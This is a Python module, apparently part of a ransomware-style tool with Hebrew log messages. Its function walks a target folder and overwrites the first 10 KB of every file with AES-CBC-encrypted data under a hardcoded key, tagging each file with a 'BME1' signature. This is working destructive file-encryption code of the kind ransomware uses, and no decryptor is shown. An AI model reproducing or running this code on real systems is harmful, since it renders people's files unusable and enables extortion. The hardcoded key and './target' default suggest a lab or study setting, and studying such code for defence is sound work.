import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from modules.utils import log_action

key = bytes.fromhex("3031323334353637383961626364656630313233343536373839616263646566")
SIGNATURE = b"BME1"
CHUNK_SIZE = 10 * 1024

def encrypt_files(key: bytes, folder: str = "./target"):

    for root, _, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            try:
                with open(path, "rb") as f:
                    data = f.read()

                header = data[:CHUNK_SIZE]
                tail = data[CHUNK_SIZE:]

                iv = os.urandom(16)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                encrypted_header = cipher.encrypt(pad(header, AES.block_size))

                with open(path, "wb") as f:
                    f.write(SIGNATURE + iv + encrypted_header + tail)

                log_action(f"הוצפן: {path}")
            except Exception as e:
                log_action(f"שגיאה בהצפנה {path}: {str(e)}")
